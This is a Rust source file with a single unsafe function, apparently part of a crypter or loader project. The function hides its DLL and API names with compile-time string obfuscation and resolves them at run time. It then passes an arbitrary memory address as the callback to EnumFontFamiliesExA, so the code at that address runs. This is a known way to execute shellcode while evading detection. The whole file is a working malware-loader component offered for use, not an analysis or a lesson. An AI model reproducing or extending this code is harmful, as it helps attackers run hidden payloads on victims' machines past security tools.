pub unsafe fn exec(p: usize) -> Result<(), String> {
    use crate::utils::{load_library, get_proc_address};
    use rustcrypt_ct_macros::{obf_lit, obf_lit_bytes};
    use std::mem::transmute;

    #[repr(C)]
    #[derive(Default, Copy, Clone)]
    struct LogFontA {
        lf_height: i32,
        lf_width: i32,
        lf_escapement: i32,
        lf_orientation: i32,
        lf_weight: i32,
        lf_italic: u8,
        lf_underline: u8,
        lf_strike_out: u8,
        lf_char_set: u8,
        lf_out_precision: u8,
        lf_clip_precision: u8,
        lf_quality: u8,
        lf_pitch_and_family: u8,
        lf_face_name: [u8; 32],
    }

    let gdi32 = load_library(obf_lit_bytes!(b"gdi32.dll\0").as_slice())?;
    let user32 = load_library(obf_lit_bytes!(b"user32.dll\0").as_slice())?;

    let p_enum_font = get_proc_address(gdi32, obf_lit_bytes!(b"EnumFontFamiliesExA\0").as_slice())?;
    let p_get_dc = get_proc_address(user32, obf_lit_bytes!(b"GetDC\0").as_slice())?;
    let p_release_dc = get_proc_address(user32, obf_lit_bytes!(b"ReleaseDC\0").as_slice())?;

    type EnumFontFamiliesExAFn = unsafe extern "system" fn(
        hdc: isize,
        lp_logfont: *const LogFontA,
        lp_enum_font_fam_ex_proc: Option<unsafe extern "system" fn(*const std::ffi::c_void, *const std::ffi::c_void, u32, isize) -> i32>,
        l_param: isize,
        dw_flags: u32,
    ) -> i32;
    type GetDCFn = unsafe extern "system" fn(hwnd: isize) -> isize;
    type ReleaseDCFn = unsafe extern "system" fn(hwnd: isize, hdc: isize) -> i32;

    let enum_font_families_ex_a: EnumFontFamiliesExAFn = transmute(p_enum_font);
    let get_dc: GetDCFn = transmute(p_get_dc);
    let release_dc: ReleaseDCFn = transmute(p_release_dc);

    let logfont: LogFontA = std::mem::zeroed();
    type FontEnumProc = Option<unsafe extern "system" fn(*const std::ffi::c_void, *const std::ffi::c_void, u32, isize) -> i32>;
    let cb: FontEnumProc = Some(std::mem::transmute(p));
    let hdc = get_dc(0);
    if hdc == 0 {
        return Err(obf_lit!("GetDC failed").to_string());
    }
    let ret = enum_font_families_ex_a(hdc, &logfont, cb, 0, 0);
    release_dc(0, hdc);
    if ret == 0 {
        return Err(obf_lit!("EnumFontFamiliesExA failed or callback not triggered").to_string());
    }
    Ok(())
}